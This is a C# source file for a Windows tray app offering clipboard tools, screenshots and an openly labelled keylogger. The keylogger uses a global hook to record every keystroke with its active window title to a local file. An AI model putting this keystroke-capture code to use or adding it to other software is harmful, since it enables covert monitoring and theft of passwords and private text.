using Gma.System.MouseKeyHook;
using System.Drawing.Imaging;

namespace l8dod3csharp
{
    static class Program
    {
        static NotifyIcon trayIcon;
        static IKeyboardMouseEvents globalHook;
        static List<Bitmap> screenshots = new List<Bitmap>();

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Create Tray Icon
            trayIcon = new NotifyIcon()
            {
                Icon = SystemIcons.Application,
                Text = "Clipboard & Screen Tool",
                Visible = true
            };

            // Tray menu
            var menu = new ContextMenuStrip();
            menu.Items.Add("Clean Formatting", null, (s, e) => CleanClipboard());
            menu.Items.Add("Clear Clipboard", null, (s, e) => ClearClipboard());
            menu.Items.Add("Uppercase Clipboard", null, (s, e) => UppercaseClipboard());
            menu.Items.Add("Lowercase Clipboard", null, (s, e) => LowercaseClipboard());
            menu.Items.Add("Capture Screen", null, (s, e) => CaptureScreen());
            menu.Items.Add("Save GIF", null, (s, e) => SaveGif());
            menu.Items.Add("Start Keylogger", null, (s, e) => StartKeyLogger());
            menu.Items.Add("Stop Keylogger", null, (s, e) => StopKeyLogger());
            menu.Items.Add("Exit", null, (s, e) => { trayIcon.Visible = false; Application.Exit(); });

            trayIcon.ContextMenuStrip = menu;

            Application.Run();
        }

        // ---------------- Clipboard ----------------
        static void CleanClipboard()
        {
            if (Clipboard.ContainsText())
            {
                string text = Clipboard.GetText();
                Clipboard.SetText(text);
                MessageBox.Show("Clipboard formatting cleared!");
            }
        }

        static void ClearClipboard()
        {
            Clipboard.Clear();
            MessageBox.Show("Clipboard cleared!");
        }

        static void UppercaseClipboard()
        {
            if (Clipboard.ContainsText())
            {
                Clipboard.SetText(Clipboard.GetText().ToUpper());
                MessageBox.Show("Clipboard converted to uppercase!");
            }
        }

        static void LowercaseClipboard()
        {
            if (Clipboard.ContainsText())
            {
                Clipboard.SetText(Clipboard.GetText().ToLower());
                MessageBox.Show("Clipboard converted to lowercase!");
            }
        }

        // ---------------- Screen Capture ----------------
        static void CaptureScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }
            screenshots.Add(screenshot);
            MessageBox.Show("Screenshot captured!");
        }

        static void SaveGif()
        {
            if (screenshots.Count == 0)
            {
                MessageBox.Show("No screenshots to save!");
                return;
            }

            string filename = $"screenshots_{DateTime.Now.Ticks}.gif";
            screenshots[0].Save(filename, ImageFormat.Gif);
            screenshots.Clear();
            MessageBox.Show($"GIF saved as {filename}");
        }

        // ---------------- Keylogger ----------------
        static StreamWriter keylogFile = new StreamWriter("key_log.txt", true);
        static void StartKeyLogger()
        {
            globalHook = Hook.GlobalEvents();
            globalHook.KeyPress += GlobalHookKeyPress;
            MessageBox.Show("Keylogger started!");
        }

        static void StopKeyLogger()
        {
            if (globalHook != null)
            {
                globalHook.KeyPress -= GlobalHookKeyPress;
                globalHook.Dispose();
                MessageBox.Show("Keylogger stopped!");
            }
        }

        private static void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            string activeWindow = GetActiveWindowTitle();
            keylogFile.WriteLine($"{DateTime.Now} - {e.KeyChar} - Window: {activeWindow}");
            keylogFile.Flush();
        }

        // ---------------- Active Window ----------------
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);

        static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            System.Text.StringBuilder Buff = new System.Text.StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return "Unknown";
        }
    }
}
